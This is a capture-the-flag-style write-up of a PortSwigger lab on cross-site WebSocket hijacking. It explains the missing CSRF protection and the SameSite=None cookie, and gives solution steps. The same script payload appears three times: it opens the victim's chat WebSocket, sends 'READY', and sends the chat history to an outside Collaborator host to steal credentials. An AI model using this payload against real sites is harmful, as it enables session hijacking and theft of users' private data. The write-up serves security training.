
---

# 🧪 Lab: Cross-site WebSocket Hijacking

Lab URL: [https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)

## High-Level Summary

**Objective:** Use a cross-site WebSocket hijacking attack to exfiltrate the victim's chat history and gain access to their account.

**Key Techniques & Concepts:**

- **WebSockets:** Real-time communication protocol.
    
- **CSRF and WebSocket Misconfiguration:** No CSRF protection in the WebSocket handshake.
    
- **Exfiltration:** Capturing sensitive data using WebSocket message manipulation.
    

**What Makes This Vulnerable?**

- **No CSRF Protection:** WebSocket connections lack proper token verification.
    
- **SameSite=None Cookie Setting:** The `SameSite=None` cookie allows cross-origin requests, enabling WebSocket hijacking when combined with a missing CSRF token.
    

---

## PortSwigger Solution

1. **Interact with the Chat:**
    
    - Click "Live chat" and send a message.
        
    - Reload the page to confirm messages persist.
        
2. **Observe WebSocket Traffic:**
    
    - In **Burp Suite > Proxy > WebSockets History**, observe the "READY" command retrieving past messages.
        
3. **Identify WebSocket Vulnerability:**
    
    - Check **HTTP history** for the WebSocket handshake request.
        
    - Observe the lack of CSRF tokens in the WebSocket connection.
        
4. **Craft the Exploit:**
    
    - In **Burp Collaborator**, copy your unique payload URL.
    
    - Use the following exploit payload on the exploit server:
    
    
    ```
    <script>
      var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
      ws.onopen = function() {
          ws.send('READY');
      };
      ws.onmessage = function(event) {
          fetch('https://YOUR-COLLABORATOR-ID', {
              method: 'POST',
              mode: 'no-cors',
              body: event.data
          });
      };
    </script>
    ```
    
5. **Exploit Execution:**
    
    - Replace `YOUR-LAB-ID` and `YOUR-COLLABORATOR-ID` with your actual WebSocket and Collaborator URLs.
        
    - Click **View Exploit** and send the payload.
        
6. **Retrieve Victim's Credentials:**
    
    - Poll for interactions in **Burp Collaborator**.
        
    - Verify the chat history exfiltration and locate the victim's credentials.
        
7. **Login as Victim:**
    
    - Use the exfiltrated credentials to log in to the victim's account.
        

✅ **Lab Completed Successfully**

---

## Instructor Solution

### Step 1: Identify the Chat Storage Mechanism

- Send a message in the live chat.
    
- Reload the page and confirm message persistence.
    
- Check the **Application > Cookies** tab and observe the cookie with `SameSite=None`.


### Step 2: Analyze WebSocket Traffic

- In **Burp Suite > Proxy > HTTP History**, locate the `/chat` WebSocket handshake with a `101 Switching Protocol` response.
    
- Switch to **WebSocket History** and observe messages including `PING`, `PONG`, and `READY`.


### Step 3: Understand the WebSocket Behavior

- The server sends chat history only after receiving a `READY` message. This message acts as a trigger for the server to release the chat history, making it critical for exploitation.
    

### Step 4: Craft the Payload

- Use the following payload in the exploit server:
    
    ```
    <script>
      var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
      ws.onopen = function() {
          ws.send('READY');
      };
      ws.onmessage = function(event) {
          fetch('https://YOUR-COLLABORATOR-ID', {
              method: 'POST',
              mode: 'no-cors',
              body: event.data
          });
      };
    </script>
    ```
    

### Step 5: Deploy the Payload

- Send the payload using the **Exploit Server**.
    
- Confirm successful data exfiltration in **Burp Collaborator**.
    

✅ **Lab Completed Successfully**

---

## Explanation of Payloads and Techniques

### **WebSockets Overview:**

- WebSockets enable full-duplex communication between a client and a server.
    
- In this attack, the vulnerability lies in insufficient origin checking and missing CSRF protections.


### **Importance of SameSite=None:**

- The `SameSite=None` attribute allows cross-origin requests, which can lead to attacks when combined with a lack of CSRF protection.
    
- Cookies set with this attribute are accessible across different origins, making them vulnerable to hijacking.


### **Why the** `**READY**` **Message Matters:**

- The `READY` message sent by the WebSocket client triggers the server to send the chat history.
    
- Exploiting this behavior enables exfiltration of sensitive information from the victim's chat history.


### **How the Payload Works:**

1. **WebSocket Connection Creation:**
    
    - The script establishes a connection to the WebSocket server with the `new WebSocket()` function.
        
2. **Triggering the Chat History:**
    
    - Once connected, the script sends the `READY` message, triggering the server to send the chat history.
        
3. **Exfiltration of Data:**
    
    - When the server responds with the chat history, the `onmessage` event captures the data.
        
    - The data is sent to an external server using a `fetch()` request with `no-cors` mode to avoid preflight checks.
    

### **Key Indicators of Vulnerability:**

- No CSRF protection on WebSocket connections.
    
- `SameSite=None` allowing cross-origin resource sharing without additional protections.
    

---

## Tools and Commands

- **Burp Suite:** WebSockets History, Collaborator
    
- **Payload:**
    
    ```
    <script>
      var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
      ws.onopen = function() {
          ws.send('READY');
      };
      ws.onmessage = function(event) {
          fetch('https://YOUR-COLLABORATOR-ID', {
              method: 'POST',
              mode: 'no-cors',
              body: event.data
          });
      };
    </script>
    ```
    
- **Resources:** [PortSwigger WebSockets Security Guide](https://portswigger.net/web-security/websockets)